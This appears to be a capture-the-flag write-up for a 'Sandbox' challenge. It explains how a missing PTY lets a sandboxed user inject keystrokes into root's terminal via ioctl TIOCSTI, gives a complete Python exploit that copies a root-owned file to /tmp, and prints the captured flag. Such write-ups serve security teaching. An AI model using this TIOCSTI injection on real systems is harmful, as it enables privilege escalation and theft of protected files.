# Sandbox

Author: `cobra`

I made a program where you can practice running commands in a sandboxed environment.

## Solution

Although the sandbox changes the permissions of our user, it does not use a PTY for our shell, so we still have access to the root process's TTY. This means we can inject into `/dev/tty` to run commands as root using ioctl and TIOCSTI.

```python
import ctypes

libc = ctypes.CDLL('libc.so.6')
open = libc.open
open.argtypes = [ctypes.c_char_p, ctypes.c_int]
open.restype = ctypes.c_int
fd = open(b'/dev/tty', 2)
print(fd)

ioctl = libc.ioctl
ioctl.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_char_p]
ioctl.restype = ctypes.c_int
TIOCSTI = 0x5412
cmd = '\ncat /root/flag.txt > /tmp/flag.txt\n'
for c in cmd:
    r = ioctl(fd, TIOCSTI, ctypes.c_char_p(c.encode()))
    if r < 0:
        print('ioctl failed')
        break

libc.close(fd)

print('Done')
```
This lets us inject the command `cat /root/flag.txt > /tmp/flag.txt` into the terminal, which will write the flag to a file in `/tmp`. We can simply read this file to get the flag.

```
$ cat /tmp/flag.txt
gigem{n0t_4n_1ssue_1n_ARCH_b7w}
```

flag:
`gigem{n0t_4n_1ssue_1n_ARCH_b7w}`
